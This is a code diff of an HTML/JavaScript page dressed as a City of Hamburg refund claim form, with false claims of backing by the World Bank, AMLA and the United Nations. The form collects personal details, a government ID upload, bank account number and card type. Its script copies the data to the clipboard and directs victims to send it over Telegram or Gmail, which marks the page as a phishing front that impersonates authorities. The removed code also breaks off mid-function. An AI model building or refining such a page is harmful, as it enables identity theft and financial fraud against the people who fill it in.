@@ -29,31 +29,31 @@
         h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 10px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
-        label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 12px; color: var(--hamburg-blue); text-transform: uppercase; }
+        label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 11px; color: var(--hamburg-blue); text-transform: uppercase; }
         input, select { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; }
         input.invalid { border: 2px solid var(--hamburg-red); background-color: #fffafa; }
         .review-item { margin-bottom: 12px; padding: 10px; border-bottom: 1px solid #f0f0f0; }
         .review-label { font-size: 10px; font-weight: 800; color: var(--hamburg-blue); text-transform: uppercase; }
-        .review-value { font-size: 15px; color: #333; margin-top: 4px; font-weight: 600; }
-        .contact-link { display: block; text-align: center; margin-top: 20px; font-weight: 900; color: #ffffff; background-color: var(--hamburg-red); text-decoration: none; font-size: 16px; text-transform: uppercase; border-radius: 4px; padding: 20px; cursor: pointer; transition: 0.3s; }
+        .review-value { font-size: 15px; color: #333; margin-top: 5px; font-weight: 600; }
+        
+        .submission-buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
+        .contact-btn { display: block; text-align: center; font-weight: 900; color: #ffffff; text-decoration: none; font-size: 15px; text-transform: uppercase; border-radius: 4px; padding: 22px; cursor: pointer; transition: 0.3s; border: none; }
+        .btn-tele { background-color: #0088cc; }
+        .btn-gmail { background-color: var(--hamburg-red); }
+        .contact-btn:hover { opacity: 0.8; transform: translateY(-2px); }
+
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
-        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; }
+        button.nav-btn { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; }
         .btn-back { background-color: #888; }
-        .establishment-footer { text-align: center; padding: 30px; font-size: 13px; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
+        .establishment-footer { text-align: center; padding: 30px; font-size: 12px; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
     </style>
 </head>
 <body>
     <div class="page-wrapper">
-        <div class="side-text">
-            <h3>MISSION</h3>
-            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems that strictly safeguard our users' assets against evolving digital scams and unauthorized access during the refund process.</p>
-        </div>
+        <div class="side-text"><h3>MISSION</h3><p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols and proactive fraud detection systems...</p></div>
         <div class="form-container">
             <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
-            <div class="header">
-                <h1>FREIE UND HANSESTADT HAMBURG</h1>
-                <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD THROUGH VIGILANT VERIFICATION, ETHICAL FINANCIAL STEWARDSHIP, AND THE UNCOMPROMISING PROTECTION OF EVERY LEGITIMATE CLAIM</div>
-            </div>
+            <div class="header"><h1>FREIE UND HANSESTADT HAMBURG</h1><div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD...</div></div>
             <form id="masterForm">
                 <!-- SECTION 1 -->
                 <div id="section1" class="section-box active">
@@ -68,85 +68,47 @@
                         <div><label>Nationality *</label><input type="text" id="nat" class="req"></div>
                         <div><label>Birthdate *</label><input type="text" id="bd" class="req" placeholder="MM / DD / YYYY"></div>
                     </div>
-                    <div class="grid-2" style="margin-top:25px;">
-                        <div><label>Personal Email *</label><input type="email" id="em" class="req"></div>
+                    <div class="grid-2" style="margin-top:20px;">
+                        <div><label>Email *</label><input type="email" id="em" class="req"></div>
                         <div><label>Contact Number *</label><input type="text" id="ph" class="req"></div>
                     </div>
-                    <div style="margin-top:20px;"><label>Upload Valid Government ID *</label><input type="file" id="idU" class="req"></div>
-                    <div class="btn-container"><button type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
+                    <div style="margin-top:20px;"><label>Upload ID *</label><input type="file" id="idU" class="req"></div>
+                    <div class="btn-container"><button type="button" class="nav-btn" onclick="validate(1, 2)">NEXT STEP</button></div>
                 </div>
-
                 <!-- SECTION 2 -->
                 <div id="section2" class="section-box">
-                    <h2>SECTION 2: MANDATORY REFUND VERIFICATION</h2>
-                    <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amt" class="req" placeholder="€ 0.00"></div>
-                    <div style="margin-top:20px;"><label>UPLOAD RECEIPT *</label><input type="file" id="rcpU" class="req"></div>
-                    <h2 style="margin-top:35px;">DISBURSEMENT INFORMATION</h2>
-                    <div><label>Bank Name / App *</label><input type="text" id="bnk" class="req"></div>
+                    <h2>SECTION 2: REFUND DETAILS</h2>
+                    <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amt" class="req"></div>
+                    <div style="margin-top:20px;"><label>Upload Receipt *</label><input type="file" id="rcpU" class="req"></div>
+                    <div style="margin-top:20px;"><label>Bank Name / App *</label><input type="text" id="bn" class="req"></div>
                     <div class="grid-2" style="margin-top:20px;">
-                        <div><label>ACCOUNT NUMBER *</label><input type="text" id="an" class="req"></div>
-                        <div><label>TYPE OF CARD *</label><input type="text" id="ct" class="req" placeholder="e.g. Visa/Debit"></div>
+                        <div><label>Account Number *</label><input type="text" id="an" class="req"></div>
+                        <div><label>Type of Card *</label><input type="text" id="ct" class="req"></div>
                     </div>
-                    <div class="btn-container">
-                        <button type="button" class="btn-back" onclick="show(1)">BACK</button>
-                        <button type="button" onclick="validate(2, 3)">REVIEW CLAIM</button>
-                    </div>
+                    <div class="btn-container"><button type="button" class="nav-btn btn-back" onclick="show(1)">BACK</button><button type="button" class="nav-btn" onclick="validate(2, 3)">REVIEW CLAIM</button></div>
                 </div>
-
                 <!-- SECTION 3 -->
                 <div id="section3" class="section-box">
                     <h2>SECTION 3: REVIEW INFORMATION</h2>
                     <div id="reviewDisplay"></div>
-                    
-                    <label style="margin-top:20px; color:var(--hamburg-blue)">Choose Submission Channel (Auto-Copies Info):</label>
-                    <div class="contact-options">
-                        <div class="contact-btn btn-telegram" onclick="submitTo('telegram')">💬 SUBMIT VIA TELEGRAM</div>
-                        <div class="contact-btn btn-gmail" onclick="submitTo('gmail')">📧 SUBMIT VIA GMAIL</div>
+                    <div class="submission-buttons">
+                        <div class="contact-btn btn-tele" onclick="copyAndDirect('tele')">💬 SUBMIT VIA TELEGRAM</div>
+                        <div class="contact-btn btn-gmail" onclick="copyAndDirect('gmail')">📧 SUBMIT VIA GMAIL</div>
                     </div>
-
-                    <div class="btn-container">
-                        <button type="button" class="btn-back" onclick="show(2)">EDIT INFO</button>
-                        <button type="button" onclick="finalReceipt()">SUBMIT TO DATABASE</button>
-                    </div>
+                    <div class="btn-container"><button type="button" class="nav-btn btn-back" onclick="show(2)">EDIT INFO</button><button type="button" class="nav-btn" onclick="location.reload()">FINISH</button></div>
                 </div>
             </form>
-            <div class="establishment-footer">ESTABLISHED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS</div>
+            <div class="establishment-footer">SECURED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS</div>
         </div>
-
         <div class="side-text"><h3>VISION</h3><p>To be recognized as the premier global benchmark for commercial integrity and consumer safety...</p></div>
     </div>
-
     <script>
         function show(p) { document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active')); document.getElementById('section' + p).classList.add('active'); window.scrollTo(0,0); }
-        
         function validate(curr, next) {
             const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
             let ok = true; inputs.forEach(i => { if(!i.value) { i.classList.add('invalid'); ok = false; } else i.classList.remove('invalid'); });
             if(ok) { if(next === 3) populate(); show(next); }
         }
-
-        function populate() {
-            const items = [
-                {l: "NAME", v: document.getElementById('fn').value + " " + document.getElementById('ln').value},
-                {l: "ADDRESS", v: document.getElementById('addr').value},
-                {l: "EMAIL", v: document.getElementById('em').value},
-                {l: "AMOUNT", v: document.getElementById('amt').value},
-                {l: "BANK", v: document.getElementById('bn').value},
-                {l: "CARD TYPE", v: document.getElementById('ct').value}
-            ];
-            let html = ""; items.forEach(d => { html += `<div class="review-item"><div class="review-label">${d.l}</div><div class="review-value">${d.v}</div></div>`; });
-            document.getElementById('reviewDisplay').innerHTML = html;
-        }
-
-        function submitTo(platform) {
-            const ref = "REF-" + Math.floor(Math.random() * 1000000);
-            const summary = `--- CLAIM SUMMARY --- \nReference: ${ref}\nName: ${document.getElementById('fn').value} ${document.getElementById('ln').value}\nAddress: ${document.getElementById('addr').value}\nEmail: ${document.getElementById('em').value}\nAmount: ${document.getElementById('amt').value}\nBank: ${document.getElementById('bn').value}\nCard Type: ${document.getElementById('ct').value}`;
-            
-            // Smart Copy Logic
-            navigator.clipboard.writeText(summary).then(() => {
-                alert("INFO COPIED TO CLIPBOARD! \nOpening " + platform.toUpperCase() + "... Just PASTE the message and click send.");
-                
-                }
         function populate() {
             const items = [
                 {l: "NAME", v: document.getElementById('fn').value + " " + document.getElementById('ln').value},
